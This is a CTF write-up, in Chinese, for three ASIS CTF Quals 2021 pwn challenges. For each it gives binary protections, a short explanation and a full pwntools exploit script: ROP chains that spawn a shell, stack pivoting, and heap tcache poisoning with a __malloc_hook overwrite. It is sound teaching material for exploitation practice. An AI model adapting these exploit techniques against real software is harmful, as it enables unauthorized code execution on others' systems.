## Pwn

### JustPwnIt

```
// file
./chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped

// checksec
[*] '/home/u1f383/writeups-2021/ASIS_CTF_Quals/justpwnit/distfiles/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



hijack rbp 後，由於在上層的 function epilogue 會執行 `leave ; ret`，就會執行到我們所控制的 ROP chain，exploit：

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./chall')
gdb.attach(r, "b *0x4011F2")
syscall = 0x4013e9
mov_qptr_rdi_rax_ret = 0x401ce7 # mov qword ptr [rdi], rax ; ret
pop_rax_ret = 0x401001
pop_rdi_ret = 0x401b0d
pop_rsi_ret = 0x4019a3
pop_rdx_ret = 0x403d23
data = 0x40b000
sh = 0x7ffff7ffe01b

payload = flat(
    0xdeadbeef,

    pop_rdi_ret,
    data,
    pop_rax_ret,
    0x68732f6e69622f,
    mov_qptr_rdi_rax_ret,
    pop_rax_ret,
    0x3b,
    pop_rsi_ret,
    0,
    pop_rdx_ret,
    0,
    syscall
)

r.sendlineafter('Index: ', str(-2))
r.sendlineafter('Data: ', payload)
r.interactive()
```



### abbr

```
// file
./chall: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=6175d64be9a98f36489336bafc550b7fae7c0363, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/home/u1f383/writeups-2021/ASIS_CTF_Quals/abbr/distfiles/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



利用程式撰寫漏洞蓋 fucntion pointer，而這邊使用 `xchg eax, esp ; ret` 做 stack pivoting，exploit 如下：

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./chall')
gdb.attach(r, """
b *0x402010
b *0x402015
""")

mov_qptr_rdi_rsi_ret = 0x45684f
xchg_eax_esp_ret = 0x405121
pop_rdi_ret = 0x4018da
pop_rsi_ret = 0x404cfe
pop_rdx_ret = 0x4017df
pop_rax_ret = 0x45a8f7
syscall = 0x4012e3
data = 0x4ccd40

payload = flat(
    pop_rdi_ret,
    data,
    pop_rsi_ret,
    0x0068732f6e69622f,
    mov_qptr_rdi_rsi_ret,
    pop_rsi_ret,
    0,
    pop_rdx_ret,
    0,
    pop_rax_ret,
    0x3b,
    syscall
)

r.sendlineafter('Enter text: ', b'www'*257 + p64(xchg_eax_esp_ret))
r.sendlineafter('Enter text: ', payload)
r.interactive()
```



### strvec

```
// file
./chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ced70ca24d07669b7b947319b11de9648ee20c4d, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/home/u1f383/writeups-2021/ASIS_CTF_Quals/strvec/distfiles/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```



因為 integer overflow 的關係，vector size 雖然會記錄 vector 大小為一個很大的值，但是實際上 `malloc()` 傳入的大小會是 overflow 的結果 `0`，因此可以任意透過 `set` 與 `get` 操控 heap chunk。libc address 透過 unsorted chunk 來 leak，heap address 則透過 tcache，不過最後在做 exploit 時，因為每次 freed chunk 都會先被 `malloc(0x20)` 所拿到，tcache counter 不會超過 1，因此不能直接做 tcache poison，在這邊參考此 [writeup](https://ctftime.org/writeup/31081)，透過把 tcache struct 放到 unsorted bin 當中，讓 fd 與 bk 剛好可以蓋到 0x30 chunk 的 counter，counter 變成一個很大的值後就可以做 tcache poison，不過在此之後如果執行 `malloc(0x20)`，因為 tcache 當中已經沒有 chunk，因此 glibc 會先去 unsorted bin 找，而此時 unsorted bin 指向的是 tcache struct，是一個非法的 chunk，會讓 `malloc(0x20)` 壞掉，所以我們沒辦法蓋 `__free_hook` 做到直接執行 `system("/bin/sh")`，而是透過 `__malloc_hook` + one gadget 拿到 shell，以下為 exploit：

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

INT_MAX = 2147483647

r = process('./chall')
gdb.attach(r, """

""")

r.sendafter('Name: ', '\n')
# 0x7fffffff+1 == 0x80000000
# 0x80000000 << 3 will overflow => 0x0
r.sendlineafter('n = ', str(INT_MAX))

def get(idx):
    r.sendlineafter('1. get\n2. set\n> ', '1')
    r.sendlineafter('idx = ', str(idx))

def _set(idx, data):
    r.sendlineafter('1. get\n2. set\n> ', '2')
    r.sendlineafter('idx = ', str(idx))
    r.sendafter('data = ', data)

_set(0, '\n')
_set(3, p64(0) + p64(0x31) + b'\n')
get(0)
r.recvuntil('vec.get(idx) -> ')
heap = u64(r.recv(6).ljust(8, b'\x00'))
info(f"heap: {hex(heap)}")
_set(0, p64(heap + 0x10) + b'\n')

# spray
for i in range(4, 7):
    _set(i, '\n')
_set(11, '\n')
_set(12, '\n')
for i in range(16, 19):
    _set(i, p64(0) + p64(0x291) + b'\n')
for i in range(21, 25):
    _set(i, p64(0) + p64(0x291) + b'\n')
for i in range(27, 32):
    _set(i, p64(0) + p64(0x291) + b'\n')
for i in range(33, 38):
    _set(i, p64(0) + p64(0x291) + b'\n')
_set(15, '\n')
_set(1, p64(0)*3 + p64(0x421)[:-1])
_set(0, '\n')
_set(4, 'aaaa\n')
get(5)
r.recvuntil('vec.get(idx) -> ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
__free_hook = libc + 0x1eeb28
__malloc_hook = libc + 0x1ebb70
_system = libc + 0x55410
info(f"libc: {hex(libc)}")
_set(7, p64(heap + 0x130) + p64(heap + 0x160) + p64(heap + 0x190) + p64(heap + 0x1c0)[:-1])
_set(3, p64(heap + 0x1f0) + p64(heap + 0x220) + p64(heap + 0x250) + p64(heap - 0x2e0)[:-1])
_set(4, '\n')
_set(5, '\n')
_set(6, '\n')
_set(21, '\n')
_set(22, '\n')
_set(23, '\n')

_set(3, '\n')
_set(21, '\n')
_set(21, p64(__malloc_hook) + p64(0) + b'\n')
_set(24, p64(heap + 0x70) + p64(0x31) + b'/bin/sh'[::-1] + b'\n')
_set(9, '\n')
_set(11, p64(libc + 0xe6c81) + b'\n')
r.sendlineafter('1. get\n2. set\n> ', '2')
r.sendlineafter('idx = ', '21')
r.interactive()
```

官方 [writeup](https://ptr-yudai.hatenablog.com/) 則是先用 `libc.symbol('environ')` leak stack address，在算出 canary 的 offset 取得 canary，最後 overwrite return address 成 one gadget，利用 stack 的解法也是他沒有用 `seccomp` 的原因，因此上面透過將 tcache struct 放入 unsorted bin 的解法並非他的預期解。